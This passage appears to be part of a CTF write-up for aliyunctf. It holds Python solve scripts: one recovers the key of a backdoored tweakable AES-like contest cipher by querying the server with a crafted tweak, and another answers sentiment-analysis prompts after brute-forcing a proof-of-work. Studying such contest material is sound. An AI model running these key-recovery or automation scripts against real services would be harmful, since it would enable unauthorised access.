    s_box = (    0x41, 0x2E, 0x6A, 0x26, 0x74, 0xD6, 0xB9, 0x6D, 0x27, 0x39, 0x63, 0xEC, 0xD5, 0xDC, 0x2C, 0x70,    0xA6, 0xC1, 0x58, 0xA7, 0x0C, 0x5A, 0xCE, 0x02, 0xB5, 0x4A, 0xF1, 0xDD, 0xD3, 0x7C, 0xBF, 0xFE,    0x3A, 0xE4, 0x67, 0xCB, 0x60, 0x37, 0x5C, 0x93, 0xD1, 0x77, 0xAF, 0xAB, 0x38, 0xBC, 0xE1, 0x17,    0x35, 0x07, 0xB7, 0xBA, 0xB6, 0xB0, 0x4E, 0xB1, 0x69, 0x20, 0xCF, 0xEF, 0x9A, 0xEB, 0xFD, 0x32,    0xF0, 0x13, 0x00, 0xE0, 0x18, 0x9C, 0x52, 0x50, 0x4D, 0x24, 0x9B, 0xE2, 0x36, 0x2A, 0xAD, 0x59,    0xFB, 0xB4, 0x19, 0xF4, 0x48, 0xF7, 0x6B, 0x6C, 0x7B, 0x81, 0x3F, 0xD0, 0x68, 0x1A, 0x5D, 0x8A,    0x4C, 0xD8, 0xAE, 0xD7, 0x2B, 0x2D, 0x9D, 0xFA, 0x97, 0x1B, 0x43, 0xAA, 0x06, 0x14, 0x10, 0xD2,    0x28, 0x9E, 0xB8, 0x78, 0x5B, 0x85, 0xA4, 0x7D, 0x23, 0x92, 0x25, 0x46, 0x62, 0xA3, 0x42, 0x0D,    0x09, 0xE3, 0x83, 0x0F, 0xF6, 0x7F, 0x31, 0x6F, 0xC3, 0xDE, 0x79, 0x99, 0x03, 0x22, 0xA9, 0xB3,    0x1F, 0x7A, 0x01, 0x0E, 0xDB, 0xDF, 0xE6, 0x0A, 0x3B, 0x57, 0xCC, 0xEA, 0x30, 0x98, 0xDA, 0x16,    0x2F, 0x3E, 0x29, 0x54, 0x87, 0x8D, 0x72, 0x40, 0x3D, 0xFC, 0x66, 0xCD, 0xE7, 0x84, 0x7E, 0xC6,    0xA8, 0xAC, 0x51, 0x65, 0x71, 0x08, 0x33, 0x6E, 0x1D, 0x80, 0x55, 0xBB, 0x5E, 0x61, 0xC2, 0xF2,    0x76, 0x91, 0xF8, 0x45, 0x64, 0xFF, 0x86, 0x95, 0xEE, 0x1C, 0xE9, 0x8B, 0x12, 0x34, 0xC4, 0x8C,    0x56, 0x90, 0x5F, 0x82, 0xA2, 0x53, 0x96, 0x73, 0xBE, 0x88, 0x47, 0x4B, 0x15, 0xBD, 0xC5, 0x3C,    0xD9, 0xCA, 0xE8, 0xF9, 0x4F, 0xA0, 0xC0, 0x04, 0xB2, 0x9F, 0x11, 0x21, 0xA1, 0x0B, 0x44, 0xE5,    0x89, 0x8F, 0x75, 0x1E, 0xC9, 0x94, 0x8E, 0xC8, 0x49, 0xF5, 0x05, 0xD4, 0xED, 0xF3, 0xC7, 0xA5,    )    Constants = [        0x4d7f6272fa2b30231ff271b11265b29e,        0x87590fe9a805a3feefc710abdc104f51,        0xcbcae366693452003b30f0c6c6512d51,        0x46fa1c00c058e3929667197beba269a6,        0x0377c657fdc1b7d6eb5c1f08299013d8,        0xdf45e38398bcbc33818f1d21159cca89,        0x254a53e8a055e79672bf4781a3e0371b,        0x121a7c76c50df79fbab9346b6b899dce,        0x1381be9c3e73304d09c153e81d21bd5e,        0xcdc6bfdf5d354c1fcaad1ec5c95dd200    ]            def __init__(self):        self.key = bytearray(os.urandom(self.keysize))        self.InvSbox = SBox(s_box).inverse()    def _sub_bytes(self, s):        for i in range(4):            for j in range(4):                s[i][j] = self.s_box[s[i][j]]
    def __inv_sub_bytes(self, s):        for i in range(4):            for j in range(4):                s[i][j] = self.InvSbox[s[i][j]]                    def _shift_rows(self, s):        s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1]        s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]        s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]
    def __inv_shift_rows(self, s):        s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1]        s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]        s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]
    def _add_round_key(self, s, k):        for i in range(4):            for j in range(4):                s[i][j] ^= k[i][j]
    _xtime = lambda self, a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)
    def _mix_single_column(self, a):        # see Sec 4.1.2 in The Design of Rijndael        t = a[0] ^ a[1] ^ a[2] ^ a[3]        u = a[0]        a[0] ^= t ^ self._xtime(a[0] ^ a[1])        a[1] ^= t ^ self._xtime(a[1] ^ a[2])        a[2] ^= t ^ self._xtime(a[2] ^ a[3])        a[3] ^= t ^ self._xtime(a[3] ^ u)
    def _mix_columns(self, s):        for i in range(4):            self._mix_single_column(s[i])
    def __inv_mix_columns(self, s):        # see Sec 4.1.3 in The Design of Rijndael        for i in range(4):            u = self._xtime(self._xtime(s[i][0] ^ s[i][2]))            v = self._xtime(self._xtime(s[i][1] ^ s[i][3]))            s[i][0] ^= u            s[i][1] ^= v            s[i][2] ^= u            s[i][3] ^= v
        self._mix_columns(s)
    def _bytes2matrix(self, text):        """ Converts a 16-byte array into a 4x4 matrix.  """        return [list(text[i:i+4]) for i in range(0, len(text), 4)]
    def _matrix2bytes(self, matrix):        """ Converts a 4x4 matrix into a 16-byte array.  """        return bytes(sum(matrix, []))
    def _expand_key(self, key):        perm = [8, 1, 7, 2, 0, 3, 4, 9, 5, 6]        key_bytes = list(key)        assert(len(key_bytes) == 10)        round_keys = []
        for i in range(self.rounds):            rk = []            rk.append( [key_bytes[i] for i in range(4)] )            rk.append( [key_bytes[i] for i in range(4, 8)] )            rk.append( [key_bytes[i] for i in range(4)] )            rk.append( [key_bytes[i] for i in range(4, 8)] )
            round_keys.append(rk)
            p_key_bytes = [0] * 10
            for p in range(10):                p_key_bytes[perm[p]] = key_bytes[p]
            key_bytes = p_key_bytes            key_bytes[0] = self.s_box[key_bytes[0]]
        rk = []        rk.append( [0]*4 )        rk.append( [0]*4 )        rk.append( [key_bytes[i] for i in range(4)] )        rk.append( [key_bytes[i] for i in range(4, 8)] )        round_keys.append(rk)                return round_keys
    def _expand_tweak(self, tweak_bits):        assert(len(tweak_bits) == 128)        round_tweaks = []
        for i in range(self.rounds):            rt = [bytes(4), bytes(4)]            tweak2 = []            tweak3 = []
            for j in range(4):                tweak2_byte = ""                tweak3_byte = ""                for b in range(8):                    tweak2_byte += tweak_bits[ (11*(i+1) + (j*8) + b) % 128 ]                    tweak3_byte += tweak_bits[ (11*(i+1) + 32 + (j*8) + b) % 128 ]
                tweak2.append( int(tweak2_byte, 2) )                tweak3.append( int(tweak3_byte, 2) )
            rt.append(bytes(tweak2))            rt.append(bytes(tweak3))
            round_tweaks.append(rt)
        return round_tweaks
    def _add_constants(self, p, r):
        for col in range(4):            for row in range(4):                con = (self.Constants[r] >> (((3-col)*4 + (3-row)) * 8)) & ((1<<8) - 1)
                p[col][row] ^= con
    def encrypt(self, plaintext, tweak):        assert len(plaintext) == 16        p = self._bytes2matrix(plaintext)        tweak = bin(int(tweak, 16))[2:].zfill(128)  # 16bytes        round_keys = self._expand_key(self.key)        round_tweaks = self._expand_tweak(tweak)
        for i in range(self.rounds - 1):            self._add_round_key(p, round_keys[i])            self._add_round_key(p, round_tweaks[i])            self._add_constants(p, i)
            self._sub_bytes(p)            self._shift_rows(p)            self._mix_columns(p)
        self._add_round_key(p, round_keys[self.rounds-1])        self._add_round_key(p, round_tweaks[self.rounds-1])        self._add_constants(p, self.rounds-1)        self._sub_bytes(p)        self._shift_rows(p)        self._add_round_key(p, round_keys[self.rounds])
        return self._matrix2bytes(p)
    def decrypt(self, ciphertext, tweak):        p = self._bytes2matrix(ciphertext)        tweak = bin(int(tweak, 16))[2:].zfill(128)  # 16bytes        round_keys = self._expand_key(self.key)        round_tweaks = self._expand_tweak(tweak)
        self._add_round_key(p, round_keys[self.rounds])        self.__inv_shift_rows(p)        self.__inv_sub_bytes(p)        self._add_constants(p, self.rounds-1)        self._add_round_key(p, round_tweaks[self.rounds-1])        self._add_round_key(p, round_keys[self.rounds-1])
        for i in range(8, -1, -1):            self.__inv_mix_columns(p)            self.__inv_shift_rows(p)            self.__inv_sub_bytes(p)            self._add_constants(p, i)            self._add_round_key(p, round_tweaks[i])            self._add_round_key(p, round_keys[i])
        return self._matrix2bytes(p)
Constants = [        0x4d7f6272fa2b30231ff271b11265b29e,        0x87590fe9a805a3feefc710abdc104f51,        0xcbcae366693452003b30f0c6c6512d51,        0x46fa1c00c058e3929667197beba269a6,        0x0377c657fdc1b7d6eb5c1f08299013d8,        0xdf45e38398bcbc33818f1d21159cca89,        0x254a53e8a055e79672bf4781a3e0371b,        0x121a7c76c50df79fbab9346b6b899dce,        0x1381be9c3e73304d09c153e81d21bd5e,        0xcdc6bfdf5d354c1fcaad1ec5c95dd200    ]const_10round = []for r in range(10):    tmp_round = []    for col in range(0, 4):        tmp = []        for row in range(4):            con = (Constants[r] >> (((3-col)*4 + (3-row)) * 8)) & ((1<<8) - 1)            tmp.append(con)        tmp_round.append(tmp)    const_10round.append(tmp_round)tk_bits = [0]*128for r in range(10):    rt = const_10round[r]    tk0 = [i for i in bytearray(rt[0])]    tk1 = [i for i in bytearray(rt[1])]    tk2 = [i for i in bytearray(rt[2])]    tk3 = [i for i in bytearray(rt[3])]    for j in range(4):        tk2_byte = bin(tk2[j]^tk0[j])[2:].zfill(8)        tk3_byte = bin(tk3[j]^tk1[j])[2:].zfill(8)        for b in range(8):            if tk_bits[(11*(r+1) + (j*8) + b) % 128 ] == 0:                tk_bits[ (11*(r+1) + (j*8) + b) % 128 ] = tk2_byte[b]            else:                if tk_bits[(11*(r+1) + (j*8) + b) % 128 ] != tk2_byte[b]:                    print("Collision")            if tk_bits[(11*(r+1) + 32 + (j*8) + b) % 128 ]== 0:                tk_bits[ (11*(r+1) + 32 + (j*8) + b) % 128 ] = tk3_byte[b]            else:                if tk_bits[(11*(r+1) + 32 + (j*8) + b) % 128 ] != tk3_byte[b]:                    print("Collision")
tk_bits = ''.join(tk_bits)tweak = hex(int(tk_bits, 2))
from pwn import *from hashlib import sha256from string import ascii_letters, ascii_lowercase, digits
for _ in range(256):    r = remote('crypto2.aliyunctf.com', 13337)    def proof(r):        text=r.recvline()        print(text)        tmp=text.split(b'XXXX + ')[-1]        suf,val=tmp.strip().split(b') == ')        suf=suf.decode()        val=val.decode()        poss=ascii_letters + digits        for a in poss:            for b in poss:                for c in poss:                    for d in poss:                        digest = sha256((a+b+c+d+suf).encode()).hexdigest()                        if(digest==val):                            r.sendline((a+b+c+d).encode())                            return
    instance = TAES_Oracle()    sbox = SBox(instance.s_box)    Sinv = sbox.inverse()
    proof(r)            r.recvuntil(b'Enter your challenge: >')    m = b'x00' * 16    r.sendline(m.hex().encode())    r.recvuntil(b'Enter your challenge tweak: >')    r.sendline(tweak.encode())    enc = bytes.fromhex(r.recvline().strip().decode())    r.recvuntil(b'You got a challenge: ')    challenge = bytes.fromhex(r.recvline().strip().decode())    r.recvuntil(b'Tweak used:')    init_tweak = r.recvline().strip().decode()    r.recvuntil(b'Enter your guess: >')
    enc_matrix = instance._bytes2matrix(enc)    key9 = xor(enc_matrix[0], enc_matrix[2])    key10 = xor(enc_matrix[1], enc_matrix[3])
    k3 = key9[:]    k4 = key10[:]    keys = [None, k3[1], Sinv[k4[3]], Sinv[k3[2]], Sinv[Sinv[k3[0]]], Sinv[k3[3]], Sinv[k4[0]], None, Sinv[k4[1]], Sinv[k4[2]]]    is_True = False    for i in range(128):        if is_True:            break        for j in range(128):            keys[0] = i            keys[7] = j            instance.key = bytes(keys)            enc2 = instance.encrypt(m, tweak)            if enc2 == enc:                print("Found key")                keys = bytes(keys)                is_True = True                break    instance.key = keys    token = instance.decrypt(challenge, init_tweak)    r.sendline(token.hex().encode())    r.recvline()    try:        r.recvline()    except:        r.close()        continue# aliyunctf{8ackd00r_15_ev3rywh3re}
```



```
# pip install nltk# import nltk# nltk.download('vader_lexicon')# nltk.download('punkt')# nltk.download('stopwords')

import hashlibimport itertoolsfrom pwn import *from string import digits, ascii_letters, punctuationfrom nltk.sentiment.vader import SentimentIntensityAnalyzerfrom nltk.corpus import stopwordsfrom nltk.tokenize import word_tokenizefrom nltk.stem import PorterStemmer
def preprocess_text(text):    # 分词    words = word_tokenize(text)
    # 去除停用词和非字母字符    stop_words = set(stopwords.words('english'))    words = [word for word in words if word.isalpha() and word not in stop_words]
    # 词干提取    ps = PorterStemmer()    words = [ps.stem(word) for word in words]
    # 返回处理后的词汇列表    sen = ','.join(words)    return sen
def sentiment_analysis(r, pos, neg, neu):    sentence = r.recvline().decode()    sentiment = sia.polarity_scores(sentence)    print('[+]The compound is :{}'.format(sentiment['compound']))    if sentiment['compound'] > 0.3:        r.sendlineafter(b'answer:', pos)    elif sentiment['compound'] < -0.15:        r.sendlineafter(b'answer:', neg)    else:        r.sendlineafter(b'answer:', neu)
def proof_work(prefix:bytes,output:str):    s = bytes([i for i in range(97,97+26)])+b"0123456789"    for a1 in s:        for a2 in s:            for a3 in s:                for a4 in s:                    t = bytes([a1,a2,a3,a4])                    m = prefix+t                    if hashlib.sha256(m).hexdigest()==output:                        return twhile True:        try:            sia = SentimentIntensityAnalyzer()            r = remote("misc0.aliyunctf.com", 9999)            message = r.recvline().decode()            context.log_level = 'debug'            print(message)
            alpha_bet = digits + ascii_letters + punctuation            strlist = itertools.product(alpha_bet, repeat=4)
            sha26 = message.split('=')[1].strip()            start = message.find('"')+1            end = message.find('"', start)            head = message[start:end]
                        ans = proof_work(head.encode(),sha26)            # r.interactive()            r.sendline(ans)            r.sendlineafter(b'n)', b'n')
            pos = 'positive'.encode()            neg = 'negative'.encode()            neu = 'neutral'.encode()
            r.sendlineafter(b'n)', b'y')            for i in range(15):                sentiment_analysis(r, pos, neg, neu)
            break  # 如果执行成功，跳出无限循环        except EOFError:            r.close()            continue
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/6-1711767266.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/4-1711767268.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/10-1711767268.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/2-1711767269.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/9-1711767271.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/5-1711767274.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/4-1711767281.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/3-1711767290.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/8-1711767304.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/7-1711767306.png)